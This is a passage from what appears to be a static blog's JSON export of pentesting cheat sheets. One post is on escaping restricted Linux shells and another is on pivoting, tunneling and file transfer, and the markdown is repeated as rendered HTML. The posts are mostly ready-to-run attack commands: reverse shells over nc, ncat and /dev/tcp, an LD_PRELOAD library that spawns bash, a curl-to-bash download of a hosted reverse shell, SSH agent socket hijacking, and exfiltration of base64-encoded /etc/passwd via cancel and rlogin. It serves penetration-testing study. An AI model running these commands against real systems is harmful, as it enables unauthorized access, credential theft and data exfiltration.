sourcing ~/.bashrc or ~/.bash_profile\nssh user@$IP -t \"bash --noprofile\"\n```\n\n<br>\n\n## Use text editors\n```bash\nvim -c ':!/bin/sh'\nvi -c ':!/bin/sh'\n```\n```bash\nnano # (Ctrl+R, Ctrl+X)\n/bin/sh\n```\n```bash\ned\n:!bash\n```\n\n<br>\n\n## Using `less`, `more` and `man`\n```bash\nless /etc/hosts\n!bash\n```\n```bash\nmore /etc/hosts\n!bash\n```\n```bash\nman\n!sh\n```\n\n<br>\n\n## Use other utilities\n```bash rev shell\nncat -e /bin/bash $IP $port\n```\n```bash\nfind . -exec /bin/sh \\;\n```\n```bash\nnmap --interactive\n!sh\n```\n```bash\nawk 'BEGIN {system(\"/bin/bash\")}'\n```\n```bash\ntcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /bin/sh -Z root\n```\n```bash\nftp\n!/bin/sh\n```\n```bash\ngdb\n!/bin/sh\n```\n```bash\ngdb -p $$\n!/bin/sh\n```\n```bash\nscp -S /tmp/exit.sh x y:\n```\n```bash Use SUID binaries - passwd for example\npasswd -r compat -s\n```\n\n<br>\n\n## More options\n```bash Create symlink\nln -sf /bin/bash restricted_shell\n```\n```bash Write to files\necho \"evil code\" | tee script.sh\n```\n```bash rev shell\n# On restricted shell\nnc -lvp 4444\n# On local machine\n/bin/bash -c 'exec 5<>/dev/tcp/$remote_ip/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'\n```\n```bash \nstty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; stty rows 52 columns 208; reset;\n```\n\n<br>\n\nCreate a custom library\n1. Create a shared object\n```c /tmp/inject.c\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    system(\"/bin/bash\");\n}\n```\n2. Compile the code\n```bash\ngcc -fPIC -shared -o /tmp/libinject.so /tmp/inject.c\n```\n3. Run the restricted binary with LD_PRELOAD binary\n```bash\nexport LD_PRELOAD=/tmp/libinject.so\nrestricted_binary\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Linux/restricted-environment.md","raw":"---\ntitle: Linux - Restricted environments\ndate: 2024-08-03 11:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - restricted environment\ntoc: true\n---\n\n---\nEscape restricted Linux environments.\n\n---\n<!-- more -->\n\n## List of restricted environments\n```bash\nrbash\nrsh\nrksh\nrzsh\nlshell\n```\n\n<br>\n\n## Environment reconnaissance\n```bash See exported environment variables\nenv\n```\n```bash Find the PATH\necho $PATH\n```\n```bash View the shell used\necho $SHELL\necho $0\n```\n```bash View available commands in /usr/bin\nls -lasR /usr/bin\n```\n```bash Check the availability of a command\ntype -a command\ntype -a ls\n```\n```bash Can you use '/'?\n/bin/sh\n```\n```bash Can you set env variables?\nexport PATH=/bin:/usr/bin:$PATH\nexport SHELL=/bin/sh\n```\n```bash Can you copy files into existing PATH?\ncp /bin/sh /dir/inside/PATH; sh\n```\n```bash List available commands\ncompgen -c\n```\n\n<br>\n\n## Use built-in shells\n```bash\n# Attempt to spawn a bash shell\n/bin/bash\nbash -i\nexec /bin/bash\n\n# If bash is restricted, try sh\n/bin/sh\n\n# If neither works, try other common shells\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\nperl -e 'exec \"/bin/sh\";'\nruby -e 'exec \"/bin/sh\"'\nphp -r 'system(\"/bin/bash\");'\nphp -r 'shell_exec(\"/bin/bash\");'\nphp -a # interactive shell\n```\n\n<br>\n\n## Use SSH for remote access\n```bash Try to SSH to localhost\nssh user@localhost\n```\n```bash Replace shell with a new one running as login shell\nssh user@$IP -t \"bash -l\"\n```\n```bash Start bash without sourcing ~/.bashrc or ~/.bash_profile\nssh user@$IP -t \"bash --noprofile\"\n```\n\n<br>\n\n## Use text editors\n```bash\nvim -c ':!/bin/sh'\nvi -c ':!/bin/sh'\n```\n```bash\nnano # (Ctrl+R, Ctrl+X)\n/bin/sh\n```\n```bash\ned\n:!bash\n```\n\n<br>\n\n## Using `less`, `more` and `man`\n```bash\nless /etc/hosts\n!bash\n```\n```bash\nmore /etc/hosts\n!bash\n```\n```bash\nman\n!sh\n```\n\n<br>\n\n## Use other utilities\n```bash rev shell\nncat -e /bin/bash $IP $port\n```\n```bash\nfind . -exec /bin/sh \\;\n```\n```bash\nnmap --interactive\n!sh\n```\n```bash\nawk 'BEGIN {system(\"/bin/bash\")}'\n```\n```bash\ntcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /bin/sh -Z root\n```\n```bash\nftp\n!/bin/sh\n```\n```bash\ngdb\n!/bin/sh\n```\n```bash\ngdb -p $$\n!/bin/sh\n```\n```bash\nscp -S /tmp/exit.sh x y:\n```\n```bash Use SUID binaries - passwd for example\npasswd -r compat -s\n```\n\n<br>\n\n## More options\n```bash Create symlink\nln -sf /bin/bash restricted_shell\n```\n```bash Write to files\necho \"evil code\" | tee script.sh\n```\n```bash rev shell\n# On restricted shell\nnc -lvp 4444\n# On local machine\n/bin/bash -c 'exec 5<>/dev/tcp/$remote_ip/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'\n```\n```bash \nstty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; stty rows 52 columns 208; reset;\n```\n\n<br>\n\nCreate a custom library\n1. Create a shared object\n```c /tmp/inject.c\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    system(\"/bin/bash\");\n}\n```\n2. Compile the code\n```bash\ngcc -fPIC -shared -o /tmp/libinject.so /tmp/inject.c\n```\n3. Run the restricted binary with LD_PRELOAD binary\n```bash\nexport LD_PRELOAD=/tmp/libinject.so\nrestricted_binary\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Linux/restricted-environment","published":1,"updated":"2024-09-23T06:18:55.866Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhu000n6gvgbky91su0","content":"<hr>\n<p>Escape restricted Linux environments.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"List-of-restricted-environments\"><a href=\"#List-of-restricted-environments\" class=\"headerlink\" title=\"List of restricted environments\"></a>List of restricted environments</h2><pre><code class=\"highlight bash\">rbash\nrsh\nrksh\nrzsh\nlshell</code></pre>\n\n<br>\n\n<h2 id=\"Environment-reconnaissance\"><a href=\"#Environment-reconnaissance\" class=\"headerlink\" title=\"Environment reconnaissance\"></a>Environment reconnaissance</h2><pre><div class=\"caption\"><span>See exported environment variables</span></div><code class=\"highlight bash\"><span class=\"built_in\">env</span></code></pre>\n<pre><div class=\"caption\"><span>Find the PATH</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$PATH</span></code></pre>\n<pre><div class=\"caption\"><span>View the shell used</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$SHELL</span>\n<span class=\"built_in\">echo</span> <span class=\"variable\">$0</span></code></pre>\n<pre><div class=\"caption\"><span>View available commands in</span><a href=\"/usr/bin\">link</a></div><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lasR /usr/bin</code></pre>\n<pre><div class=\"caption\"><span>Check the availability of a command</span></div><code class=\"highlight bash\"><span class=\"built_in\">type</span> -a <span class=\"built_in\">command</span>\n<span class=\"built_in\">type</span> -a <span class=\"built_in\">ls</span></code></pre>\n<pre><div class=\"caption\"><span>Can you use '/'?</span></div><code class=\"highlight bash\">/bin/sh</code></pre>\n<pre><div class=\"caption\"><span>Can you set env variables?</span></div><code class=\"highlight bash\"><span class=\"built_in\">export</span> PATH=/bin:/usr/bin:<span class=\"variable\">$PATH</span>\n<span class=\"built_in\">export</span> SHELL=/bin/sh</code></pre>\n<pre><div class=\"caption\"><span>Can you copy files into existing PATH?</span></div><code class=\"highlight bash\"><span class=\"built_in\">cp</span> /bin/sh /dir/inside/PATH; sh</code></pre>\n<pre><div class=\"caption\"><span>List available commands</span></div><code class=\"highlight bash\">compgen -c</code></pre>\n\n<br>\n\n<h2 id=\"Use-built-in-shells\"><a href=\"#Use-built-in-shells\" class=\"headerlink\" title=\"Use built-in shells\"></a>Use built-in shells</h2><pre><code class=\"highlight bash\"><span class=\"comment\"># Attempt to spawn a bash shell</span>\n/bin/bash\nbash -i\n<span class=\"built_in\">exec</span> /bin/bash\n\n<span class=\"comment\"># If bash is restricted, try sh</span>\n/bin/sh\n\n<span class=\"comment\"># If neither works, try other common shells</span>\npython -c <span class=\"string\">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>\nperl -e <span class=\"string\">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span>\nruby -e <span class=\"string\">&#x27;exec &quot;/bin/sh&quot;&#x27;</span>\nphp -r <span class=\"string\">&#x27;system(&quot;/bin/bash&quot;);&#x27;</span>\nphp -r <span class=\"string\">&#x27;shell_exec(&quot;/bin/bash&quot;);&#x27;</span>\nphp -a <span class=\"comment\"># interactive shell</span></code></pre>\n\n<br>\n\n<h2 id=\"Use-SSH-for-remote-access\"><a href=\"#Use-SSH-for-remote-access\" class=\"headerlink\" title=\"Use SSH for remote access\"></a>Use SSH for remote access</h2><pre><div class=\"caption\"><span>Try to SSH to localhost</span></div><code class=\"highlight bash\">ssh user@localhost</code></pre>\n<pre><div class=\"caption\"><span>Replace shell with a new one running as login shell</span></div><code class=\"highlight bash\">ssh user@<span class=\"variable\">$IP</span> -t <span class=\"string\">&quot;bash -l&quot;</span></code></pre>\n<pre><div class=\"caption\"><span>Start bash without sourcing ~/.bashrc or ~/.bash_profile</span></div><code class=\"highlight bash\">ssh user@<span class=\"variable\">$IP</span> -t <span class=\"string\">&quot;bash --noprofile&quot;</span></code></pre>\n\n<br>\n\n<h2 id=\"Use-text-editors\"><a href=\"#Use-text-editors\" class=\"headerlink\" title=\"Use text editors\"></a>Use text editors</h2><pre><code class=\"highlight bash\">vim -c <span class=\"string\">&#x27;:!/bin/sh&#x27;</span>\nvi -c <span class=\"string\">&#x27;:!/bin/sh&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">nano <span class=\"comment\"># (Ctrl+R, Ctrl+X)</span>\n/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">ed\n:!bash</code></pre>\n\n<br>\n\n<h2 id=\"Using-less-more-and-man\"><a href=\"#Using-less-more-and-man\" class=\"headerlink\" title=\"Using less, more and man\"></a>Using <code>less</code>, <code>more</code> and <code>man</code></h2><pre><code class=\"highlight bash\">less /etc/hosts\n!bash</code></pre>\n<pre><code class=\"highlight bash\">more /etc/hosts\n!bash</code></pre>\n<pre><code class=\"highlight bash\">man\n!sh</code></pre>\n\n<br>\n\n<h2 id=\"Use-other-utilities\"><a href=\"#Use-other-utilities\" class=\"headerlink\" title=\"Use other utilities\"></a>Use other utilities</h2><pre><div class=\"caption\"><span>rev shell</span></div><code class=\"highlight bash\">ncat -e /bin/bash <span class=\"variable\">$IP</span> <span class=\"variable\">$port</span></code></pre>\n<pre><code class=\"highlight bash\">find . -<span class=\"built_in\">exec</span> /bin/sh \\;</code></pre>\n<pre><code class=\"highlight bash\">nmap --interactive\n!sh</code></pre>\n<pre><code class=\"highlight bash\">awk <span class=\"string\">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">tcpdump -<span class=\"built_in\">ln</span> -i eth0 -w /dev/null -W 1 -G 1 -z /bin/sh -Z root</code></pre>\n<pre><code class=\"highlight bash\">ftp\n!/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">gdb\n!/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">gdb -p $$\n!/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">scp -S /tmp/exit.sh x y:</code></pre>\n<pre><div class=\"caption\"><span>Use SUID binaries - passwd for example</span></div><code class=\"highlight bash\">passwd -r compat -s</code></pre>\n\n<br>\n\n<h2 id=\"More-options\"><a href=\"#More-options\" class=\"headerlink\" title=\"More options\"></a>More options</h2><pre><div class=\"caption\"><span>Create symlink</span></div><code class=\"highlight bash\"><span class=\"built_in\">ln</span> -sf /bin/bash restricted_shell</code></pre>\n<pre><div class=\"caption\"><span>Write to files</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;evil code&quot;</span> | <span class=\"built_in\">tee</span> script.sh</code></pre>\n<pre><div class=\"caption\"><span>rev shell</span></div><code class=\"highlight bash\"><span class=\"comment\"># On restricted shell</span>\nnc -lvp 4444\n<span class=\"comment\"># On local machine</span>\n/bin/bash -c <span class=\"string\">&#x27;exec 5&lt;&gt;/dev/tcp/$remote_ip/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">stty</span> raw -<span class=\"built_in\">echo</span>; <span class=\"built_in\">fg</span>; <span class=\"built_in\">export</span> SHELL=/bin/bash; <span class=\"built_in\">export</span> TERM=xterm-256color; <span class=\"built_in\">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; <span class=\"built_in\">stty</span> rows 52 columns 208; reset;</code></pre>\n\n<br>\n\n<p>Create a custom library</p>\n<ol>\n<li>Create a shared object<pre><div class=\"caption\"><span>/tmp/inject.c</span></div><code class=\"highlight c\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span>\n<span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span>\n\n<span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">inject</span><span class=\"params\">()</span> __<span class=\"title function_\">attribute__</span><span class=\"params\">((constructor))</span>;\n\n<span class=\"type\">void</span> <span class=\"title function_\">inject</span><span class=\"params\">()</span> &#123;\n    system(<span class=\"string\">&quot;/bin/bash&quot;</span>);\n&#125;</code></pre></li>\n<li>Compile the code<pre><code class=\"highlight bash\">gcc -fPIC -shared -o /tmp/libinject.so /tmp/inject.c</code></pre></li>\n<li>Run the restricted binary with LD_PRELOAD binary<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> LD_PRELOAD=/tmp/libinject.so\nrestricted_binary</code></pre></li>\n</ol>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Escape restricted Linux environments.</p>\n<hr>","more":"<h2 id=\"List-of-restricted-environments\"><a href=\"#List-of-restricted-environments\" class=\"headerlink\" title=\"List of restricted environments\"></a>List of restricted environments</h2><pre><code class=\"highlight bash\">rbash\nrsh\nrksh\nrzsh\nlshell</code></pre>\n\n<br>\n\n<h2 id=\"Environment-reconnaissance\"><a href=\"#Environment-reconnaissance\" class=\"headerlink\" title=\"Environment reconnaissance\"></a>Environment reconnaissance</h2><pre><div class=\"caption\"><span>See exported environment variables</span></div><code class=\"highlight bash\"><span class=\"built_in\">env</span></code></pre>\n<pre><div class=\"caption\"><span>Find the PATH</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$PATH</span></code></pre>\n<pre><div class=\"caption\"><span>View the shell used</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"variable\">$SHELL</span>\n<span class=\"built_in\">echo</span> <span class=\"variable\">$0</span></code></pre>\n<pre><div class=\"caption\"><span>View available commands in</span><a href=\"/usr/bin\">link</a></div><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lasR /usr/bin</code></pre>\n<pre><div class=\"caption\"><span>Check the availability of a command</span></div><code class=\"highlight bash\"><span class=\"built_in\">type</span> -a <span class=\"built_in\">command</span>\n<span class=\"built_in\">type</span> -a <span class=\"built_in\">ls</span></code></pre>\n<pre><div class=\"caption\"><span>Can you use '/'?</span></div><code class=\"highlight bash\">/bin/sh</code></pre>\n<pre><div class=\"caption\"><span>Can you set env variables?</span></div><code class=\"highlight bash\"><span class=\"built_in\">export</span> PATH=/bin:/usr/bin:<span class=\"variable\">$PATH</span>\n<span class=\"built_in\">export</span> SHELL=/bin/sh</code></pre>\n<pre><div class=\"caption\"><span>Can you copy files into existing PATH?</span></div><code class=\"highlight bash\"><span class=\"built_in\">cp</span> /bin/sh /dir/inside/PATH; sh</code></pre>\n<pre><div class=\"caption\"><span>List available commands</span></div><code class=\"highlight bash\">compgen -c</code></pre>\n\n<br>\n\n<h2 id=\"Use-built-in-shells\"><a href=\"#Use-built-in-shells\" class=\"headerlink\" title=\"Use built-in shells\"></a>Use built-in shells</h2><pre><code class=\"highlight bash\"><span class=\"comment\"># Attempt to spawn a bash shell</span>\n/bin/bash\nbash -i\n<span class=\"built_in\">exec</span> /bin/bash\n\n<span class=\"comment\"># If bash is restricted, try sh</span>\n/bin/sh\n\n<span class=\"comment\"># If neither works, try other common shells</span>\npython -c <span class=\"string\">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>\nperl -e <span class=\"string\">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span>\nruby -e <span class=\"string\">&#x27;exec &quot;/bin/sh&quot;&#x27;</span>\nphp -r <span class=\"string\">&#x27;system(&quot;/bin/bash&quot;);&#x27;</span>\nphp -r <span class=\"string\">&#x27;shell_exec(&quot;/bin/bash&quot;);&#x27;</span>\nphp -a <span class=\"comment\"># interactive shell</span></code></pre>\n\n<br>\n\n<h2 id=\"Use-SSH-for-remote-access\"><a href=\"#Use-SSH-for-remote-access\" class=\"headerlink\" title=\"Use SSH for remote access\"></a>Use SSH for remote access</h2><pre><div class=\"caption\"><span>Try to SSH to localhost</span></div><code class=\"highlight bash\">ssh user@localhost</code></pre>\n<pre><div class=\"caption\"><span>Replace shell with a new one running as login shell</span></div><code class=\"highlight bash\">ssh user@<span class=\"variable\">$IP</span> -t <span class=\"string\">&quot;bash -l&quot;</span></code></pre>\n<pre><div class=\"caption\"><span>Start bash without sourcing ~/.bashrc or ~/.bash_profile</span></div><code class=\"highlight bash\">ssh user@<span class=\"variable\">$IP</span> -t <span class=\"string\">&quot;bash --noprofile&quot;</span></code></pre>\n\n<br>\n\n<h2 id=\"Use-text-editors\"><a href=\"#Use-text-editors\" class=\"headerlink\" title=\"Use text editors\"></a>Use text editors</h2><pre><code class=\"highlight bash\">vim -c <span class=\"string\">&#x27;:!/bin/sh&#x27;</span>\nvi -c <span class=\"string\">&#x27;:!/bin/sh&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">nano <span class=\"comment\"># (Ctrl+R, Ctrl+X)</span>\n/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">ed\n:!bash</code></pre>\n\n<br>\n\n<h2 id=\"Using-less-more-and-man\"><a href=\"#Using-less-more-and-man\" class=\"headerlink\" title=\"Using less, more and man\"></a>Using <code>less</code>, <code>more</code> and <code>man</code></h2><pre><code class=\"highlight bash\">less /etc/hosts\n!bash</code></pre>\n<pre><code class=\"highlight bash\">more /etc/hosts\n!bash</code></pre>\n<pre><code class=\"highlight bash\">man\n!sh</code></pre>\n\n<br>\n\n<h2 id=\"Use-other-utilities\"><a href=\"#Use-other-utilities\" class=\"headerlink\" title=\"Use other utilities\"></a>Use other utilities</h2><pre><div class=\"caption\"><span>rev shell</span></div><code class=\"highlight bash\">ncat -e /bin/bash <span class=\"variable\">$IP</span> <span class=\"variable\">$port</span></code></pre>\n<pre><code class=\"highlight bash\">find . -<span class=\"built_in\">exec</span> /bin/sh \\;</code></pre>\n<pre><code class=\"highlight bash\">nmap --interactive\n!sh</code></pre>\n<pre><code class=\"highlight bash\">awk <span class=\"string\">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">tcpdump -<span class=\"built_in\">ln</span> -i eth0 -w /dev/null -W 1 -G 1 -z /bin/sh -Z root</code></pre>\n<pre><code class=\"highlight bash\">ftp\n!/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">gdb\n!/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">gdb -p $$\n!/bin/sh</code></pre>\n<pre><code class=\"highlight bash\">scp -S /tmp/exit.sh x y:</code></pre>\n<pre><div class=\"caption\"><span>Use SUID binaries - passwd for example</span></div><code class=\"highlight bash\">passwd -r compat -s</code></pre>\n\n<br>\n\n<h2 id=\"More-options\"><a href=\"#More-options\" class=\"headerlink\" title=\"More options\"></a>More options</h2><pre><div class=\"caption\"><span>Create symlink</span></div><code class=\"highlight bash\"><span class=\"built_in\">ln</span> -sf /bin/bash restricted_shell</code></pre>\n<pre><div class=\"caption\"><span>Write to files</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;evil code&quot;</span> | <span class=\"built_in\">tee</span> script.sh</code></pre>\n<pre><div class=\"caption\"><span>rev shell</span></div><code class=\"highlight bash\"><span class=\"comment\"># On restricted shell</span>\nnc -lvp 4444\n<span class=\"comment\"># On local machine</span>\n/bin/bash -c <span class=\"string\">&#x27;exec 5&lt;&gt;/dev/tcp/$remote_ip/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">stty</span> raw -<span class=\"built_in\">echo</span>; <span class=\"built_in\">fg</span>; <span class=\"built_in\">export</span> SHELL=/bin/bash; <span class=\"built_in\">export</span> TERM=xterm-256color; <span class=\"built_in\">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; <span class=\"built_in\">stty</span> rows 52 columns 208; reset;</code></pre>\n\n<br>\n\n<p>Create a custom library</p>\n<ol>\n<li>Create a shared object<pre><div class=\"caption\"><span>/tmp/inject.c</span></div><code class=\"highlight c\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span>\n<span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span>\n\n<span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">inject</span><span class=\"params\">()</span> __<span class=\"title function_\">attribute__</span><span class=\"params\">((constructor))</span>;\n\n<span class=\"type\">void</span> <span class=\"title function_\">inject</span><span class=\"params\">()</span> &#123;\n    system(<span class=\"string\">&quot;/bin/bash&quot;</span>);\n&#125;</code></pre></li>\n<li>Compile the code<pre><code class=\"highlight bash\">gcc -fPIC -shared -o /tmp/libinject.so /tmp/inject.c</code></pre></li>\n<li>Run the restricted binary with LD_PRELOAD binary<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> LD_PRELOAD=/tmp/libinject.so\nrestricted_binary</code></pre></li>\n</ol>\n<br>\n\n<hr>\n<hr>"},{"title":"Linux - Pivoting, tunneling, and sending files","date":"2024-08-03T07:00:00.000Z","toc":true,"_content":"\n---\nObtain access to other resources on the internal network.\nTransfer files in smart ways.\n\n---\n<!-- more -->\n\n## Pivoting\n\n### Encrypted shell with OpenSSL\n```bash Generate a certificate\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n```\n\n```bash Start an OpenSSL server\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n```\n\n```bash Connect from the client\nopenssl s_client -quiet -connect $IP:4444\n```\n\n<br>\n\n### Encrypted reverse shell with OpenSSl\n```bash Generate a certificate\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n```\n\n```bash Set up the listening server\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n```\n\n```bash Connect to the sever from the client and initiate the shell\nopenssl s_client -quiet -connect $IP:4444 | bash\n```\n\n<br>\n\n### Alternative: separate input and output ports\n> Using separate ports for input and output in an encrypted shell can enhance control and clarity. It allows you to monitor and debug each communication stream independently, reduces congestion by handling data in distinct channels, and offers more granular security management. This setup is particularly beneficial in complex environments.\n\n```bash Server 1: Listen on Port 4444 (for sending commands)\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n```\n\n```bash Server 2: Listen on Port 4445 (for receiving output)\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4445\n```\n\n```bash Client: Set up a two-way encrypted shell\nopenssl s_client -quiet -connect <server_ip>:4444 | bash | openssl s_client -quiet -connect <server_ip>:4445\n```\n\n<br>\n\n### Hijacking SSH agent connections \n> In SSH, an SSH agent is a program that holds private keys used for authentication. The SSH agent allows users to authenticate to remote servers without re-entering their passphrase for every SSH connection. The agent's socket, typically found in the `/tmp` directory, is used to communicate with the SSH client.\n\n1. Find SSH process\n```bash\nps aux | grep ssh\n```\n2. Locate SSH agent socket\n```bash\nls -lah /tmp\n```\n3. List cached SSH keys\n```bash naming pattern like ssh-<random-string>/agent.<pid>, where <pid> is the process ID of the SSH agent\nSSH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh-add -l\n```\n4. Hijack the SSH agent\n```bash\nSSH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh user@target\n```\n\n<br>\n\n### Metasploit `route`\n```bash Add a route manually\nmsf6 > route add 169.254.0.0 255.255.0.0 1\nmsf6 > route add 172.19.176.0 255.255.240.0 1\n```\n```bash Print the routing table\nmsf6 > route print\n```\n```bash Get specific route information\nmsf6 > route get 169.254.204.110\n```\n```bash Remove a specific route\nmsf6 > route remove 172.19.176.0/20 1\n```\n\n<br>\n\n## Metasploit `autoroute`\n```bash Background the current session\nmeterpreter > background\n```\n```bash Use the autoroute module\nmsf6 > use post/multi/manage/autoroute\n```\n```bash Set the session and subnet\nmsf6 post(multi/manage/autoroute) > set SESSION 1\nmsf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0\nmsf6 post(multi/manage/autoroute) > set NETMASK /16\n```\n```bash Run the module\nmsf6 post(multi/manage/autoroute) > run\n```\n```bash Check the routing table\nmsf6 post(multi/manage/autoroute) > route\n```\n\n<br>\n\n## Tunneling (port forwarding)\n\n### SSH\n| Argument | Legend | Explanation |\n| --- | --- | --- |\n| `-L` | `local_port:remote_address:remote_port` | local port forwarding |\n| `-R` | `port:local_address:local_port` | remote port forwarding |\n| `-D` | `local_port` | dynamic port forwarding - creates a socks proxy on localhost |\n| `-N` |  | do not execute a remote command - useful for just forwarding ports |\n\n<br>\n\n### Chisel\n> Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance. _(as described by its author)_\n\nServer (attacker machine with IP `10.10.10.20`)\n```bash\nchisel server -p 8000 --reverse\n```\nClient (victim machine with IP `10.10.10.10`, another host with IP `10.10.10.30`)\n```bash Forward local port 80 from the attacker on port 80 on the victim localhost\n./chisel client 10.10.10.20:8000 R:80:127.0.0.1:80\n```\n```bash Forward local port 4444 from the attacker on port 80 on the remote host 10.10.10.30\n./chisel client 10.10.10.20:8000 R:4444:10.10.10.30:80\n```\n```bash Set up a SOCKS5 proxy on port 1080 on the attacker \n./chisel client 10.10.10.20:8000 R:socks\n```\n\n<br>\n\n### ProxyChains (and port scanning)\n1. Establish SSH connection with dynamic port forwarding\n```bash\nssh -D 1337 user@$IP\n```\n\n2. Configure ProxyChains for dynamic port forwarding\n```bash\necho \"socks5 127.0.0.1 1337\" | sudo tee -a /etc/proxychains.conf\n# Ensure to comment out any socks4 lines in /etc/proxychains.conf\n```\n\n3. Perform port scan through the SSH tunnel\n```bash\nproxychains nmap -sT 127.0.0.1\n```\n\n<br>\n\n### Metasploit\n```bash\nportfwd add -l 1234 -p 21 -r 10.10.10.20 \nportfwd list\n```\n\n<br>\n\n## Transfer files\n\n### Host and download reverse shell\nOn attacker machine\n```bash attacker host with IP 10.10.10.20\necho 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.20 9001 >/tmp/f' > rev.sh\npython3 -m http.server 80\n```\nDownload and run reverse shell\n```bash Method 1\ncurl http://10.10.10.20/rev.sh | bash &\n```\n```bash Method 2\ncurl http://10.10.10.20/rev.sh -o /dev/shm/rev.sh; chmod +x /dev/shm/rev.sh\n/dev/shm/rev.sh\n```\n\n<br>\n\n### Encrypt data in transit\n```bash Encrypt\nopenssl enc -aes-256-cbc -pbkdf2 -k strongPass < input.txt > input.txt.enc\n```\n```bash Decrypt\nopenssl enc -d -aes-256-cbc -pbkdf2 -k strongPass < input.txt.enc > input.txt\n```\n\n<br>\n\n### Exfiltraion with `cancel` and `rlogin`\n> **`cancel`**: A command typically used to cancel print jobs, but it can also be misused for transferring data if it sends data to a networked print server.\n> **`rlogin`**: A remote login program that can be used to connect to another machine over the network. It can also be used to send data if its misconfigured or used in an unconventional way.\n\nSet up a listener (attacker machine)\n```bash\nnc -lvnp 443\n```\nSend data\n```bash cancel\ncancel -u \"$(cat /etc/passwd | base64)\" -h $IP:443\n```\n```bash rlogin\nrlogin -l \"$(cat /etc/passwd | base64)\" -p 443 $IP\n```\n\n<br>\n\n### Send and request data with `curl`\n```bash\ncurl -X PUT http://10.10.10.10/file.bin --data-binary @filename.bin\n\ncurl -X MOVE -H 'Destination: http://10.10.10.10/filename.bin' http://10.10.10.10/file.bin \n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Linux/pivot-tunnel-and-send-files.md","raw":"---\ntitle: Linux - Pivoting, tunneling, and sending files\ndate: 2024-08-03 10:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - 